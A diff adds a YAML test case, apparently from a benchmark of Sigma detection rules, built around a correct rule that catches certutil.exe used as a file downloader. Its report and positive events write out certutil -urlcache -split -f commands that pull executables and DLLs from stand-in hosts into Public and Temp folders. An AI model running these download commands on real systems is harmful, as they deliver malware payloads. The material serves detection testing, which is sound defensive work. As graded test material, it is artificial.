@@ -1,0 +1,127 @@
+id: CTL1-05
+role: control
+defect_class: NONE
+evasive: false
+why: 'Correct rule: tag T1105 is valid, -urlcache and -split are quoted in the evidence, the windash modifier
+  covers the slash spelling that certutil accepts, and the ''all'' modifier requires both switches, so
+  hash checks and cache deletion with certutil do not match.'
+expected_gate: none
+report_text: The loader retrieved its second stage with certutil.exe instead of a browser. Process creation
+  events show certutil.exe -urlcache -split -f http://203.0.113.45/svc.bin C:\Users\Public\svc.exe, run
+  from a command shell spawned by a malicious macro. The urlcache and split switches are only used together
+  when certutil is abused as a downloader. Variants of the same command used the slash form certutil.exe
+  /urlcache /split /f, which certutil accepts equally. The downloaded file was renamed and executed within
+  seconds. Rules should match certutil.exe with both the urlcache and split switches in either dash style.
+evidence:
+- certutil.exe -urlcache -split -f http://203.0.113.45/svc.bin C:\Users\Public\svc.exe
+- Rules should match certutil.exe with both the urlcache and split switches in either dash style.
+logsource: windows_process_creation
+techniques:
+- T1105
+sigma_yaml: |
+  title: Certutil Used as Downloader via Urlcache and Split
+  id: af40be52-7186-4daf-8335-60b281d35e05
+  status: experimental
+  description: 'Detects certutil.exe run with both the urlcache and split switches, in dash or slash spelling, which downloads a remote file.'
+  references:
+    - 'urn:atidep:case'
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.command_and_control
+    - attack.t1105
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection_img:
+      Image|endswith: '\certutil.exe'
+    selection_cli:
+      CommandLine|windash|contains|all:
+        - '-urlcache'
+        - '-split'
+    condition: selection_img and selection_cli
+  falsepositives:
+    - 'Administrators downloading certificate revocation data by hand'
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -urlcache -split -f http://203.0.113.45/svc.bin C:\Users\Public\svc.exe
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe /c
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe /urlcache /split /f http://files.cranemail.test/u.dll C:\Windows\Temp\u.dll
+    parent: C:\Windows\System32\wscript.exe
+    parent_cmd: wscript.exe //B C:\Users\alice\AppData\Local\Temp\inv.js
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\SysWOW64\certutil.exe
+    cmd: certutil -split -urlcache -f http://198.51.100.7/a.exe C:\Users\Public\a.exe
+    parent: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    parent_cmd: powershell.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\cmd.exe
+    cmd: cmd.exe /c whoami
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\tasklist.exe
+    cmd: tasklist /v
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\ipconfig.exe
+    cmd: ipconfig /all
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -hashfile C:\Temp\app.msi SHA256
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -urlcache * delete
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
